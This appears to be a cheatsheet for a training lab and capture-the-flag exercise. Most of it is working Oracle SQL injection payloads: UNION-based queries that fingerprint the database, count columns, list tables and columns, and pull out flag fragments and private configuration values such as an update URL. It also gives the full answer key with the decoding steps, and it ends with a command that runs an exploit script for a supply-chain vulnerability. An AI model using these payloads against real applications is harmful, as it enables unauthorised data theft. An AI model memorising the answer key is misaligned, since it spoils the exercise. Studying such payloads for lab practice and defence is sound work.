# Oracle SQL Injection Payload Cheatsheet
## OracleSecLab – Penetration Testing Reference

> ⚠️ For educational and laboratory penetration testing practice only.

---

## 1. Oracle Database Fingerprinting & Detection

```sql
-- Oracle requires the DUAL pseudo-table for parameterless queries (unlike MySQL/SQL Server)
' AND 1=1 AND ROWNUM=1 AND '1'='1
' UNION SELECT NULL FROM DUAL WHERE '1'='1

-- Retrieve Oracle Database banner and version
' UNION SELECT NULL,BANNER,NULL FROM V$VERSION WHERE ROWNUM=1 AND '1'='1

-- Retrieve current database user
' UNION SELECT NULL,USER,NULL FROM DUAL WHERE '1'='1
' UNION SELECT 1,SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL WHERE '1'='1

-- Retrieve database service / container name
' UNION SELECT 1,ORA_DATABASE_NAME,NULL FROM DUAL WHERE '1'='1
```

---

## 2. Determining Column Count

```sql
-- Incrementally add NULL placeholders until the query succeeds without ORA-01789
' UNION SELECT NULL FROM DUAL WHERE '1'='1
' UNION SELECT NULL,NULL FROM DUAL WHERE '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1   -- Target endpoint has exactly 3 columns
```

---

## 3. Determining Column Data Types

```sql
-- Test if Column 1 accepts NUMBER
' UNION SELECT 1,NULL,NULL FROM DUAL WHERE '1'='1

-- Test if Column 2 accepts VARCHAR2
' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1

-- Test if Column 3 accepts VARCHAR2
' UNION SELECT 1,'test','test2' FROM DUAL WHERE '1'='1
```

---

## 4. Enumerate Tables (Oracle Metadata)

```sql
-- Enumerate the first 5 tables via USER_TABLES
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1

-- Enumerate subsequent tables by excluding previously identified tables
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES
WHERE table_name NOT IN ('USERS','STUDENTS','COURSES','ENROLLMENTS','AUDIT_LOGS')
AND ROWNUM<=5 AND '1'='1

-- Target tables of interest for CTF flags and configurations:
-- FLAGS, AUDIT_LOGS, CONFIG_STORE, ADMIN_SECRETS, FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE
```

---

## 5. Enumerate Columns

```sql
-- Enumerate column names and data types for a specific table
' UNION SELECT 1,column_name,data_type FROM USER_TAB_COLUMNS
WHERE table_name='FLAGS' AND ROWNUM<=10 AND '1'='1

-- Enumerate columns of CONFIG_STORE (Target for Flag 1 Part C and Vulnerability 3)
' UNION SELECT 1,column_name,data_type FROM USER_TAB_COLUMNS
WHERE table_name='CONFIG_STORE' AND '1'='1
```

---

## 6. Extract Data – Flag 1 (search.php SQLi)

### Part A – from `FLAGS` table (Hex Encoded)
```sql
' UNION SELECT flag_id,flag_part,flag_code FROM FLAGS
WHERE is_active=1 AND flag_code='FL1_PART_A' AND ROWNUM=1 AND '1'='1
-- Raw output: 4442533430317B53514C5F
-- Decoding:   hex_decode("4442533430317B53514C5F") → "DBS401{SQL_"
```

### Part B – from `AUDIT_LOGS` table (Reversed String in JSON)
```sql
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS
WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1
-- Raw output: {"fragment":"_n01tc3jn1","note":"reverse_for_context",...}
-- Decoding:   reverse("_n01tc3jn1") → "1nj3ct10n_"
```

### Part C – from `CONFIG_STORE` table (Base64 Encoded)
```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE
WHERE config_key='sys_alpha_marker' AND '1'='1
-- Raw output: MHI0Y2wzIX0=
-- Decoding:   base64_decode("MHI0Y2wzIX0=") → "0r4cl3!}"
```

### Flag 1 Assembly
```
Part A: DBS401{SQL_
Part B: 1nj3ct10n_
Part C: 0r4cl3!}
─────────────────────────────────────────────
FLAG 1: DBS401{SQL_1nj3ct10n_0r4cl3!}
```

---

## 7. Extract Data – Vulnerability 3 Reconnaissance

### Locate `update_url` in `CONFIG_STORE` (is_public=0)
```sql
-- Enumerate non-public system configurations
' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE
WHERE is_public=0 AND ROWNUM<=5 AND '1'='1

-- Retrieve specific update manifest URL
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE
WHERE config_key='update_url' AND '1'='1
-- Result: http://127.0.0.1:8081/manifest.json
```

### Identify Current Application Version
```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE
WHERE config_key='app_version' AND '1'='1
-- Result: 3.1.0 (Malicious manifest must supply version > 3.1.0, e.g. 9.9.9)
```

---

## 8. Decoy Table & Honeypot Warnings

| Table / Key | Type | Description / Content |
|:---|:---|:---|
| `FLAG_ARCHIVE` | Decoy Table | Contains fake flag `DBS401{FAKE_archived_flag_123}` |
| `FAKE_FLAGS` | Decoy Table | Contains honeypot entries designed to trap naive queries |
| `FL_DECOY_B` in `FLAGS` | Decoy Row | Contains an active row with arbitrary base64 characters |
| `sys_beta_marker` in `CONFIG_STORE` | Decoy Key | Misleading base64 string mimicking real flag fragment |
| `oracle_flag_3_backup` in `ADMIN_SECRETS` | Decoy Key | Traps blind SQL injection attempts on `secret_check.php` |

---

## 9. Oracle-Specific Functions & Expressions

```sql
-- String concatenation (Oracle uses '||', not CONCAT() like MySQL)
' UNION SELECT 1,'hello'||'world',NULL FROM DUAL WHERE '1'='1

-- ASCII character conversion
CHR(68) = 'D', CHR(66) = 'B', CHR(83) = 'S'

-- Inline hex conversion (requires UTL_RAW execute permissions)
UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('4442533430317B'))  -- Evaluates to 'DBS401{'

-- Environment context queries
SYS_CONTEXT('USERENV','DB_NAME')        -- Database name
SYS_CONTEXT('USERENV','SESSION_USER')   -- Authenticated database user
SYS_CONTEXT('USERENV','IP_ADDRESS')     -- Client IP address
```

---

## 10. Row Limitation (ROWNUM vs LIMIT)

```sql
-- Oracle does not support MySQL LIMIT syntax. Use ROWNUM in the WHERE clause:
-- Invalid (MySQL):   SELECT * FROM USERS LIMIT 5;
-- Valid (Oracle):     SELECT * FROM USERS WHERE ROWNUM <= 5;

-- Ordered pagination (using subquery inline view):
SELECT * FROM (
    SELECT * FROM USERS ORDER BY user_id
) WHERE ROWNUM <= 5;

-- Oracle 12c+ modern pagination syntax:
SELECT * FROM USERS ORDER BY user_id FETCH FIRST 5 ROWS ONLY;
```

---

## 11. Flag Decode Summary Table

| Extracted Value | Decoding Routine | Output Result |
|:---|:---|:---|
| `4442533430317B53514C5F` | Hex to ASCII | `DBS401{SQL_` |
| `_n01tc3jn1` | String Reversal | `1nj3ct10n_` |
| `MHI0Y2wzIX0=` | Base64 Decode | `0r4cl3!}` |
| `4442533430317b357570...` | Half-Hex + Suffix Concatenation | `DBS401{5upp1y_Ch41n_...}` |

---

## 12. Lab CLI & Tooling Commands

```bash
# Decode Hex string
echo "4442533430317B53514C5F" | xxd -r -p

# Decode Base64 string
echo "MHI0Y2wzIX0=" | base64 -d

# Reverse string using Python
python3 -c "print('_n01tc3jn1'[::-1])"

# Automated flag assembly with project helper
python3 tools/decode_helper.py --assemble
python3 tools/decode_helper.py --hex 4442533430317B53514C5F
python3 tools/decode_helper.py --b64 MHI0Y2wzIX0=
python3 tools/decode_helper.py --rev '_n01tc3jn1'

# Automated exploit for Vulnerability 3 (Supply Chain)
python3 tools/exploit_flag3_local.py --target-host 127.0.0.1 --target-port 80
```

---

*OracleSecLab – Educational Penetration Testing Lab – Technical Reference Cheatsheet.*